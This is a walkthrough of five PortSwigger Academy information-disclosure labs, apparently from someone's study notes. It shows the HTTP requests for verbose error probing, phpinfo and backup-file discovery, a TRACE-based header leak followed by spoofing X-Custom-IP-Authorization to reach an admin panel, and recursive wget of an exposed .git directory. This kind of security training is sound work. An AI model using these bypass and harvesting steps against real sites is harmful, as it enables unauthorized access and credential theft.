# Portswigger
## Information Disclosure Vulnerabilities
### Information disclosure in error messages
```bash
# This lab's verbose error messages reveal that it is using a vulnerable version of a third-party framework. To solve the lab, obtain and submit the version number of this framework. 

Intercept is on
Click "View details"

Change "productId" value to "876876"

GET /product?productId=876876 HTTP/1.1

HTTP/1.1 404 Not Found

Change "productId" value to "hat"

GET /product?productId=hat HTTP/1.1

HTTP/1.1 500 Internal Server Error

Verbose error message revealing vulnerable server

"Apache Struts 2 2.3.31"

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220512231618.png)

### Information disclosure on debug page
```bash

# This lab contains a debug page that discloses sensitive information about the application. To solve the lab, obtain and submit the SECRET_KEY environment variable. 

Go to: Target -> Site map -> right-click current site -> engagement tools -> Discover content

/cgi-bin/phpinfo.php

After searching this drove of information you find SECRET_KEY

08jhz9dtcrjezdpl22kji6gvbsehygfs

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220512232450.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220512232532.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220512232551.png)

### Source code disclosure via backup files
```bash

# This lab leaks its source code via backup files in a hidden directory. To solve the lab, identify and submit the database password, which is hard-coded in the leaked source code. 

Go to: Target -> Site map -> right-click current site -> engagement tools -> Discover content

Nothing

Intercept is on
Click "Home"
Change:

GET / HTTP/1.1

To

GET /backup HTTP/1.1

HTTP/1.1 200 OK

ProductTemplate.java.bak

Go to:

https://ac3b1f4f1ecfe538c0d2d45e00e1002d.web-security-academy.net/backup/ProductTemplate.java.bak

Locate the poassword within the code

c66fsa1ki4wky2d8ph19j33slvfn7ilk

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220512233808.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220512234002.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220512234043.png)

### Authentication bypass via information disclosure
```bash

#  This lab's administration interface has an authentication bypass vulnerability, but it is impractical to exploit without knowledge of a custom HTTP header used by the front-end.

# To solve the lab, obtain the header name then use it to bypass the lab's authentication. Access the admin interface and delete Carlos's account.

# You can log in to your own account using the following credentials: wiener:peter 

Go to:

GET /admin HTTP/1.1

Response:

HTTP/1.1 401 Unauthorized

'Admin interface only available to local users'

Send the "/admin" end-point to repeater

Change:

GET /admin HTTP/1.1

To

TRACE /admin HTTP/1.1

HTTP/1.1 200 OK

X-Custom-IP-Authorization: 89.187.164.248

Copy "X-Custom-IP-Authorization:"

Go to: Proxy -> Options -> Match and Replace -> Add
Replace: 'X-Custom-IP-Authorization: 127.0.0.1'
Refresh Home page
'Admin panel' should be present

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220512235722.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220512235655.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220513000206.png)

### Information disclosure in version control history
```bash

# This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the administrator user then log in and delete Carlos's account. 

Go to:

https://ac0e1fb21fe24f21c0a319740070001b.web-security-academy.net/.git/

Open terminal
Create a directory to download the .git repository content

wget -r https://ac0e1fb21fe24f21c0a319740070001b.web-security-academy.net/.git/

Open 'git-cola' application
Open the recently downloaded file with 'git-cola'
Left-click 'admin.conf' -> left-click 'commit' -> 'Undo last commit' -> 'Undo last commit'

-ADMIN_PASSWORD=y2f2vcxdmbydb1aqaktj

Login is administrator:y2f2vcxdmbydb1aqaktj
Delete the username "carlos"

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220513004001.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220513004032.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220513004107.png)

#hacking
